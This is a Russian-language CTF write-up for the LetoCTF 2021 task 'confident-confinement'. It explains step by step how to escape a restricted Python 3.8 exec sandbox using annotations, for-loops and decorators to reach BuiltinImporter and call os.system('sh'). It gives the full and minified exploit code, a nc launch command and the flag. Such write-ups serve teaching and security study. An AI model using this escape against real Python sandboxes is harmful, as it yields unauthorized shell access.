# LetoCTF Taskbot 2021 | confident-confinement

## Описание

> Я вам запрещаю использовать синтаксис Python!
> 
> `nc HOST 17172`

## Файлы

- [confident-confinement.zip](static/confident-confinement.zip)

## Решение

Цель таска — исполнить код в ограниченном синтаксисе Python 3.8. 

Мы можем заслать строку не более 400 символов в длину, используя 44 разрешённых символа:

```
\t\n\x0b\x0c\r!#$.:;?@[\]_`abcdefghijklmnopqrstuvwxyz
```

Введённый код затем исполняется функцией `exec` с пустым словарём `__builtins__` — это значит, что никакие встроенные функции (`print`, `eval` и т.д.) нам недоступны:

```python
exec(code, {'__builtins__': {}})
```

Перед написанием кода зафиксируем следующие наблюдения:

- Пробелы запрещены, а сервер считывает весь код одной строкой. Чтобы это обойти, заменим в итоговом коде символ перевода строки (`\n`) на символ возврата каретки (`\r`), а символ пробела (` `) на символ `\x0c`
- Присваивания запрещены, но мы можем использовать циклы `for`, так как они создают глобальные переменные или модифицируют поля объекта или элементы структуры
- Большинство литералов (строки, числа, None) запрещены, но мы можем использовать пустой список (`[]`) или Ellipsis (`...`)
- Мы будем использовать аннотации типов, чтобы создавать строки в словаре `__annotations__`
- Мы будем использовать декораторы (`@`), чтобы вызывать функции

Наша цель — вызвать `os.system('sh')`, для этого потребуется как-то импортировать модуль `os`. К счастью, мы имеем доступ к производным от `object` классам через метод `object.__subclasses__()`, в которых содержится класс `BuiltinImporter`. Осталось придумать, как до него добраться.

### Шаг 1: создаём строку `'__build_class__'`

Чтобы использовать декораторы, нам нужны либо объявления функций (`def f(): ...`), либо объявления классов (`class x: ...`). Функции мы не можем объявить из-за запрещённых скобок, а для объявления класса нужна встроенная функция `__build_class__`, которая также отстуствует из-за пустого `__builtins__`. Всё, что нам нужно сделать для успешного объявления класса — создать функцию `__builtins__['__build_class__']`, которая принимает два аргумента.

Чтобы записать что-то по ключу `'__build_class__'`, нам нужно сначала сделать строку `'__build_class__'`. Воспользуемся аннотациями типов и укажем тип `...` для несуществующей переменной `__build_class__`:

```python
__build_class__: ...
```

Теперь в `__annotations__` лежит строка `'__build_class__'`. Так как `__annotations__` — это словарь, мы можем проитерироваться по нему и записать единственный ключ в переменную:

```python
for method_name in __annotations__:
    pass
```

После этого в переменной `method_name` лежит строка `'__build_class__'`.

### Шаг 2: создаём функцию `__build_class__`

Теперь мы готовы записать функцию в `__builtins__['__build_class__']`, осталось выбрать саму функцию. Сигнатура оригинального `__build_class__(func: function, name: str)`, где `name` — это имя класса. Если мы найдём такую функцию, которая принимает два аргумента и возвращает второй, мы сможем превращать объявления классов в строки. И такая функция есть — это `__builtins__.get(key: object, default: object)`, функция словаря, которая ищет в `__builtins__` значение по ключу `key`, и если не находит, то возвращает `default`. Аргумент `func` создаётся на лету после вызова `__build_class__`, поэтому он вряд ли будет лежать в словаре `__builtins__`, следовательно, мы будем получать второй аргумент — имя класса.

```python
for __builtins__[method_name] in [__builtins__.get]:
    pass
```

После этого `__builtins__['__build_class__']` равен `__builtins__.get`.

### Шаг 3: создаём переменную, хранящую указатель на `<class 'object'>`

`method_name` — это строка, следовательно, `method_name.__class__` — это `<class 'str'>`, тогда `method_name.__class__.__base__` — это `<class 'object'>`. Записываем:

```python
for object_type in [method_name.__class__.__base__]:
    pass
```

### Шаг 4: получаем `<class 'object'>` из объявления класса

`object_type` — это `<class 'object'>`, следовательно, `object_type.__class__` — это `<class 'type'>`, а `object_type.__class__.__name__` — это строка `'type'`. Мы помним, что при объявлении класса `class type: ...` мы получим строку `'type'`. Давайте используем её как ключ в каком-нибудь словаре (например, `__builtins__`), чтобы применить на класс декоратор `@__builtins__.get` и получить `object_type` — тип объекта:

```python
for __builtins__[object_type.__class__.__name__] in [object_type]:
    pass
```

Теперь в `__builtins__['type']` лежит `<class 'object'>`.

### Шаг 5: получаем все производные от класса `object`

Как мы помним, `object_type.__class__` — это `<class 'type'>`, значит `object_type.__class__.__subclasses__(t: type)` — это функция, возвращающая все производные от класса `t`. Если мы передадим туда `object_type`, мы получим все производные от класса `object`.

```python
@object_type.__class__.__subclasses__
@__builtins__.get
class type:
    pass
```

Объявление класса вернёт строку `'type'`, `@__builtins__.get` на этой строке вернёт `<class 'object'>`, `@object_type.__class__.__subclasses__` на нём вернёт список всех производных класса `object` и положит их в переменную `type` (имя класса).

### Шаг 6: достаём класс `BuiltinImporter` из производных от класса `object`

Запустим локально нужную версию Python и убедимся, что класс `BuiltinImporter` лежит по смещению 84 в списке производных классов (в переменной `type`), значит нам нужно воспользоваться функцией списка `type.__getitem__` и передать туда число 84. Но числа у нас запрещены, поэтому придётся как-то их выразить. Как мы помним, `method_name.__class__` — это `<class 'str'>`, следовательно `method_name.__class__.__sizeof__` — это метод класса строки, возвращающий размер структуры строки во внутренней памяти Python. Не будем погружаться во внутренности, просто попробуем разные строки и выясним, что размер 84 имеет структура строки длины 35. Создадим нужный класс и вызовем на нём эти методы:

```python
@type.__getitem__
@method_name.__class__.__sizeof__
class offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx:
    pass
```

Теперь в переменной `offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx` лежит класс `BuiltinImporter`.

### Шаг 7: импортируем `os` и вызываем `os.system('sh')`

У класса `BuiltinImporter` есть метод `load_module`, который первым аргументом принимает имя нужного модуля. Дальнейшие действия тривиальны: нам нужно создать строку `os`, вызвать на ней `BuiltinImporter.load_module`, затем создать строку `sh` и вызвать на ней `os.system`. Нам понадобится два класса:

```python
@offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx.load_module
class os:
    pass
```

После этого действия в переменной `os` лежит модуль `os`.

```python
@os.system
class sh:
    pass
```

На этом моменте мы выходим в шелл.

### Полный эксплоит без комментариев

```python
__build_class__: ...

for method_name in __annotations__:
    pass

for __builtins__[method_name] in [__builtins__.get]:
    pass

for object_type in [method_name.__class__.__base__]:
    pass

for __builtins__[object_type.__class__.__name__] in [object_type]:
    pass

@object_type.__class__.__subclasses__
@__builtins__.get
class type:
    pass

@type.__getitem__
@method_name.__class__.__sizeof__
class offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx:
    pass

@offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx.load_module
class os:
    pass

@os.system
class sh:
    pass
```

Этот эксплоит уже работает на Python 3.8, но он превышает длину 400 символов, поэтому мы его немного минифицируем вручную: вынесем `__builtins__`, переименуем по возможности переменные на односимвольные, заменим `...` и `pass` на `[]`, уберём лишние пробельные символы. Получится что-то вроде этого:

```python
__build_class__:[]
for b in[__builtins__]:[]
for m in __annotations__:[]
for b[m]in[b.get]:[]
for o in[m.__class__.__base__]:[]
for b[o.__class__.__name__]in[o]:[]
@o.__class__.__subclasses__
@b.get
class type:[]
@type.__getitem__
@m.__class__.__sizeof__
class offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx:[]
@offset_xxxxxxxxxxxxxxxxxxxxxxxxxxxx.load_module
class os:[]
@os.system
class sh:[]
```

Длина этого кода 383 символа. Нужно помнить, что при отправке на сервер нужно заменить все пробелы на `\x0c`, а переводы строк на `\r`. 

Пример решения: [solver.py](solver.py), запускать так:

```
(python3 solver.py; cat) | nc HOST 17172 -v
```

## Флаг

```
LetoCTF{d3c0r4t0r_0r13nt3d_pr0gr4mm1ng}
```
